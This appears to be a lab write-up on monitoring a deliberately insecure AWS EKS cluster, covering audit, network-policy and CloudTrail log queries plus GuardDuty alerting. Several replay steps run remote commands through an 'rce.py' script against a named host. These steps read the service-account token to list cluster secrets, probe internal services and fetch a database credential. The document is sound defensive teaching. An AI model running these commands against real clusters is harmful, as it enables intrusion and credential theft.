# react2shell: cloud monitoring

[Back](../README.md)

- [react2shell: cloud monitoring](#react2shell-cloud-monitoring)
  - [Overview](#overview)
  - [Log](#log)
    - [EKS audit log](#eks-audit-log)
    - [Netpol log](#netpol-log)
    - [CloudTrail](#cloudtrail)
  - [Detect](#detect)
    - [GuardDuty - Detection Simulation](#guardduty---detection-simulation)
  - [Alert](#alert)

---

## Overview

- Following the workflow:
  - log -> detect -> alert -> trace -> debug

- Monitoring architecture

```txt
 log          EKS audit log  ─┐
              netpol log     ─┼─▶ CloudWatch
              CloudTrail     ─┴─▶ S3
                                   │
 detect       GuardDuty  ◀─────────┘   runtime (eBPF) + audit anomaly
                                   │
 alert        EventBridge ─▶ SNS ─▶ email
```

---

## Log

### EKS audit log

- Enable log types:
  - `audit`: every k8s API call - who, verb, resource, namespace, IP.
  - `authenticator`: IAM -> k8s identity mapping; links the cloud/cluster planes.
- log group: `/aws/eks/<cluster>/cluster`
- stream `kube-apiserver-audit-*`

---

- confirm

```sh
# confirm enabled
aws eks describe-cluster --name react2shell-eks-insecure --query 'cluster.logging.clusterLogging[?enabled==`true`].types'
# [
#     [
#         "audit",
#         "authenticator"
#     ]
# ]

# SA reads the cluster secret
python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets'
    # {
    #   "metadata": {
    #     "name": "cluster-secret",
    #     "namespace": "internal",
    #   },
    #   "data": {
    #     "password": "Y0x1U1Rlci1TZWNSZVQ="
    #   },
    #   "type": "Opaque"
    # },
    # {
    #   "metadata": {
    #     "name": "container-secret",
    #     "namespace": "react",
    #   },
    #   "data": {
    #     "password": "Q29OdEFpbkVyLXNFY1JldC1JbnNFQ3VyRQ=="
    #   },
    #   "type": "Opaque"
    # }

# query: who read secrets
QID=$(aws logs start-query \
  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
    | filter @logStream like /kube-apiserver-audit/
    | filter objectRef.resource = "secrets" and verb in ["get","list"]
    | sort @timestamp desc' \
  --query queryId --output text)

# poll until "status": "Complete"
aws logs get-query-results --query-id $QID
```

---

- Query in `CloudWatch`

```sql
SOURCE "/aws/eks/react2shell-eks-insecure/cluster" START=-3600s END=0s |
fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
| filter @logStream like /kube-apiserver-audit/
| filter objectRef.resource = "secrets" and verb in ["get", "list"]
| sort @timestamp desc
| limit 100

/*
2026-10-17T18:08:50.098Z	system:serviceaccount:argocd:argocd-application-controller	list			10.0.33.70
2026-10-17T18:05:14.216Z	system:serviceaccount:react:react2shell	                    list			10.0.35.58
2026-10-17T17:58:49.848Z	system:serviceaccount:argocd:argocd-application-controller	list			10.0.33.70
*/

```

---

### Netpol log

- VPC CNI addon:
  - `enablePolicyEventLogs` + `enableCloudWatchLogs`
- CNI role:
  - `logs:CreateLogStream`
  - `PutLogEvents`;
  - Cost: +1 vCPU per node
- node file:
  - `/var/log/aws-routed-eni/network-policy-agent.log`

---

- confirm

```sh
# replay: react reaches the internal api
python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/internal/pods;'
        # "name": "internal-api-569c897c9f-42mlv",
        # "namespace": "internal",
        # "podIP": "10.0.39.236",
        #    "ports": [
        #        "containerPort": 3000,

python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -fsSL http://10.0.39.236:3000/api/v1/healthz"
# {"status":"healthy","message":"Service is running"}

python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -sS -m 5 http://internal-api.internal/api/v1/users"
# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]


# query: verdict on the react -> internal flow (dest port 3000)
# the agent logs one line of "KEY: value;" pairs - filter the stream first,
# then parse the fields out.
QID=$(aws logs start-query \
  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp
    | filter @logStream like /network-policy-agent/
    | parse @message "SIP: *;SPORT: *;DIP: *;DPORT: *;PROTOCOL: *;PolicyVerdict: *;" as sip, sport, dip, dport, proto, verdict
    | filter dport = "3000"
    | display @timestamp, sip, dip, dport, verdict
    | sort @timestamp desc
    | limit 50' \
  --query queryId --output text)

aws logs get-query-results --query-id $QID
# {
#     "queryLanguage": "CWLI",
#     "results": [
#         [
#             {
#                 "field": "@timestamp",
#                 "value": "2026-10-17 19:25:38.700"
#             },
#             {
#                 "field": "sip",
#                 "value": "10.0.40.238"
#             },
#             {
#                 "field": "dip",
#                 "value": "10.0.39.236"
#             },
#             {
#                 "field": "dport",
#                 "value": "3000"
#             },
#             {
#                 "field": "verdict",
#                 "value": "ACCEPT"
#             },
#         ],
```

- `ACCEPT` on frontend→backend = backend not isolated (missing NetworkPolicy).

---

- Query in `CloudWatch`

```sql
SOURCE "/aws/eks/react2shell-eks-insecure/cluster" START=-3600s END=0s |
fields @timestamp
| filter @logStream like /network-policy-agent/
| parse @message "SIP: *;SPORT: *;DIP: *;DPORT: *;PROTOCOL: *;PolicyVerdict: *;" as sip, sport, dip, dport, proto, verdict
| filter dport = "3000"
| display @timestamp, sip, dip, dport, verdict
| sort @timestamp desc
| limit 100

/*
@timestamp                sip         dip         dport verdict
2026-10-17T19:25:38.700Z	10.0.40.238	10.0.39.236	3000	ACCEPT
2026-10-17T19:24:51.414Z	10.0.40.238	10.0.39.236	3000	ACCEPT
2026-10-17T19:24:51.413Z	10.0.40.238	10.0.39.236	3000	ACCEPT
2026-10-17T19:18:29.571Z	10.0.35.58	10.0.39.236	3000	ACCEPT
*/
```

---

### CloudTrail

- `CloudTrail`:
  - AWS service that tracks and audits user activity and API calls for security and compliance
  - "Who did what, when, and from"

---

- confirm

```sh
# replay: IRSA token -> STS AssumeRoleWithWebIdentity -> ListSecrets -> GetSecretValue
python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js --list"

python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"

# who assumed the pod role (CloudTrail delivery lags ~5-15 min)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity \
  --query 'Events[].{time:EventTime,user:Username}' --output table

# --------------------------------------------------------------------------------------------------------------------------------
# |                                                         LookupEvents                                                         |
# +---------------------------+--------------------------------------------------------------------------------------------------+
# |           time            |                                              user                                                |
# +---------------------------+--------------------------------------------------------------------------------------------------+
# |  2026-10-17T15:59:54-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:59:09-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:51:35-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:50:20-04:00|  system:serviceaccount:react:react2shell                                                         |
# |  2026-10-17T15:48:02-04:00|  system:serviceaccount:react:react2shell                                                         |


# the crown-jewel read - also a management event, so lookup-events sees it
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
  --query 'Events[].{time:EventTime,user:Username,secret:Resources[0].ResourceName}'

# [
#     {
#         "time": "2026-10-17T16:16:04-04:00",
#         "user": "react2shell",
#         "secret": "react2shell-eks-insecure-rds-credential"
#     },
```

---

- Query in `CloudWatch`

```sql
SOURCE "/aws/cloudtrail/react2shell-eks-insecure" START=-3600s END=0s |
fields eventTime, userIdentity.arn, eventName, requestParameters.secretId
| filter eventName in ["AssumeRoleWithWebIdentity", "ListSecrets", "GetSecretValue"]
| sort @timestamp desc
| limit 50

/*
eventTime             userIdentity.arn                                                                      eventName               requestParameters.secretId
2026-10-17T20:19:16Z                                                                                        AssumeRoleWithWebIdentity
2026-10-17T20:19:16Z  arn:aws:sts::099139718958:assumed-role/react2shell-eks-insecure-pod-irsa/react2shell  ListSecrets
2026-10-17T20:16:04Z		                                                                                    AssumeRoleWithWebIdentity
2026-10-17T20:16:04Z  arn:aws:sts::099139718958:assumed-role/react2shell-eks-insecure-pod-irsa/react2shell  sGetSecretValue	react2shell-eks-insecure-rds-credential
*/
```

---

## Detect

### GuardDuty - Detection Simulation

- `GuardDuty`
  - AWS's threat detection service.
  - reads the logs and the runtime agent and raises a finding when it detects an attack — no rules to write.

- for EKS
  - `EKS_AUDIT_LOGS` - cluster plane, reads the EKS audit log
  - `RUNTIME_MONITORING` + `EKS_ADDON_MANAGEMENT` - container plane, installs the managed eBPF agent (the Falco equivalent)

- Simulation:
  - Real detection needs ~7-14 days of baseline
  - the following acts as a simulation:
    - create a sample finding to simulate the abnormal detection.

---

- confirm

```sh
# confirm runtime agent landed
kubectl -n amazon-guardduty get pods
# NAME                        READY   STATUS    RESTARTS      AGE
# aws-guardduty-agent-2wvm6   1/1     Running   6 (11m ago)   16m
# aws-guardduty-agent-9n5kx   1/1     Running   6 (12m ago)   16m
# aws-guardduty-agent-d8wsf   1/1     Running   6 (11m ago)   16m

# get detector id
DETECTOR=$(terraform -chdir=infra/eks-insecure output -raw guardduty_detector_id)

# create a sample findings for secret Accessed
aws guardduty create-sample-findings --detector-id $DETECTOR \
  --finding-types CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed

# confirm sample finding created
IDS=$(aws guardduty list-findings --detector-id $DETECTOR --query 'FindingIds' --output text)
aws guardduty get-findings --detector-id $DETECTOR --finding-ids $IDS \
  --query 'Findings[].{type:Type,sev:Severity}' --output table

# [
#     {
#         "type": "CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed",
#         "sev": 5.0
#     }
# ]
```

---

## Alert

- `GuardDuty` finding severity >= 4 -> `EventBridge` -> `SNS` emails

- Simulation

```sh
# create a finding to tigger alert
aws guardduty create-sample-findings --detector-id $DETECTOR \
  --finding-types CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed

# email arrives:
# [GuardDuty 5] CredentialAccess:Kubernetes/AnomalousBehavior.SecretsAccessed (ca-central-1)
```

---
